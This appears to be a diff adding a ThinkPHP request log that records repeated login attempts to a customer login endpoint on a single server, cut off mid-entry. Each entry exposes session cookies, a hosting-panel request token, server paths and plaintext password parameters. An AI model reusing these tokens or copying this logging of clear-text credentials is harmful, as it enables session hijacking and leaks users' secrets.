+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.022137s] [吞吐率：45.17req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019354s] [吞吐率：51.67req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:17+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020167s] [吞吐率：49.59req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019846s] [吞吐率：50.39req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018866s] [吞吐率：53.01req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.035758s] [吞吐率：27.97req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020725s] [吞吐率：48.25req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.039142s] [吞吐率：25.55req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.035484s] [吞吐率：28.18req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:19+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.023054s] [吞吐率：43.38req/s] [内存消耗：2,138.51kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:29+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019395s] [吞吐率：51.56req/s] [内存消耗：2,138.84kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:30+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.021978s] [吞吐率：45.50req/s] [内存消耗：2,138.84kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:30+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018600s] [吞吐率：53.76req/s] [内存消耗：2,138.84kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:37:58+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.020401s] [吞吐率：49.02req/s] [内存消耗：2,182.00kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:02+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018366s] [吞吐率：54.45req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.017860s] [吞吐率：55.99req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
